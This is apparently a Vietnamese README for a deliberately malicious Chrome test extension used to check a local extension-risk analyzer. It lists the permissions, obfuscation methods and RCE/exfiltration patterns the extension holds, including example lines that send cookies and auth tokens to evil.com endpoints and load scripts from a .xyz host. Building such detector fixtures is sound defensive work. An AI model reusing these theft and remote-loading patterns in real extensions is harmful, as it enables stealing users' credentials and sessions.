# Critical Risk Extension - Test Extension

Extension này được thiết kế để test hệ thống tính điểm mới với **target score ~90/100 (CRITICAL)**.

## Đặc điểm nguy hiểm

### 1. Permissions (10/10 điểm)
- `cookies` (4 điểm)
- `webRequest` (4 điểm)
- `webRequestBlocking` (3 điểm)
- `debugger` (5 điểm)
- `scripting` (3 điểm)
- `tabs` (1 điểm)
- `history` (2 điểm)
- `storage` (1 điểm)
- **Total: 23 điểm → Cap at 10**

### 2. Host Permissions (6/6 điểm)
- `<all_urls>` → 6 điểm

### 3. Content Script Scope (5/5 điểm)
- `<all_urls>` injection → 4 điểm
- `run_at = document_start` → +1 điểm
- `all_frames: true` → included

### 4. Code Patterns (15/15 điểm)
- **Critical (5 điểm):**
  - `eval()` - trong background.js
  - `new Function()` - trong background.js
  - `dynamic import()` - trong background.js
  - `setTimeout(code)` - code injection
  - `script.src = remote` - remote script loading
  - `base64 long string` (>500 chars) - trong background.js
  - `suspicious domain` (.xyz, .tk, .ml, .ga)

- **High (3 điểm):**
  - Access token (`Authorization`, `Bearer`)
  - Keylogging (`keydown` event)
  - DOM rewrite
  - Form field analysis
  - Redirect hijacking

- **Medium (1 điểm):**
  - `innerHTML =`
  - `localStorage.getItem`
  - `MutationObserver`
  - `chrome.storage.sync`

### 5. RCE/Exfiltration (100/100 điểm - Google Standard)
- **RCE Patterns:**
  - `new Function()` - 30 điểm (CRITICAL)
  - `Remote script loading` (script.src = external URL) - 30 điểm
  - `eval(fetch())` - 40 điểm (CRITICAL)
  - `external import()` - 40 điểm (CRITICAL)
  - `using proxy API` - 30 điểm

- **Exfiltration Patterns:**
  - `cookie → remote` - 40 điểm (CRITICAL)
  - `token → remote` - 40 điểm (CRITICAL)
  - `keylog → remote` - 50 điểm (CRITICAL)
  - `sendBeacon → unknown domain` - 30 điểm
  - `fetch POST → unknown domain` - 25 điểm

### 6. Obfuscation (4/4 điểm)
- Random variable names (`_0x4a2b`, `_0x1c3d`) - 2 điểm
- Multi-layer base64 (`atob(atob(...))`) - 3 điểm
- Hex/unicode escape - 4 điểm

## Tính điểm dự kiến (Google Standard)

```
Manifest Risk: 100/100 × 35% = 35.0
Code Patterns: 100/100 × 30% = 30.0
RCE/Exfil: 100/100 × 20% = 20.0
Obfuscation: 100/100 × 10% = 10.0
Chrome API Abuse: 100/100 × 5% = 5.0
─────────────────────────────
Total Weighted: 100/100
```

**Risk Level:** CRITICAL (>70) ✅

## RCE/Exfiltration Patterns được thêm:

1. **new Function()** - Pattern trong `background.js` và `content.js`
   - Sử dụng `new Function()` để execute code từ remote server
   - Score: 30 points (CRITICAL)

2. **Remote script loading** - Pattern trong `background.js` và `content.js`
   - `script.src = 'https://malicious-cdn.xyz/scripts/exploit.js'`
   - Score: 30 points (HIGH)

3. **Token/cookie theft pattern** - Pattern trong `background.js` và `content.js`
   - Steal cookies: `document.cookie` → `fetch('https://evil.com/api/steal')`
   - Steal tokens: `localStorage.getItem('auth_token')` → `fetch('https://evil.com/api/steal-tokens')`
   - Combined: cookie + token → remote server
   - Score: cookie=40, token=40, combined=80 points (CRITICAL)

## Cách test

1. Scan extension này trên Flask Analyzer UI (`http://localhost:5000`)
2. Chọn "Chọn Thư Mục Extension"
3. Chọn thư mục `test_extensions/critical_risk_extension/`
4. Click "Quét Extension"
5. Kỳ vọng: Risk Score ~90-100/100, Risk Level = CRITICAL

## Lưu ý

Extension này chỉ để **test analyzer**, không phải extension thực tế. Không nên cài đặt vào Chrome.

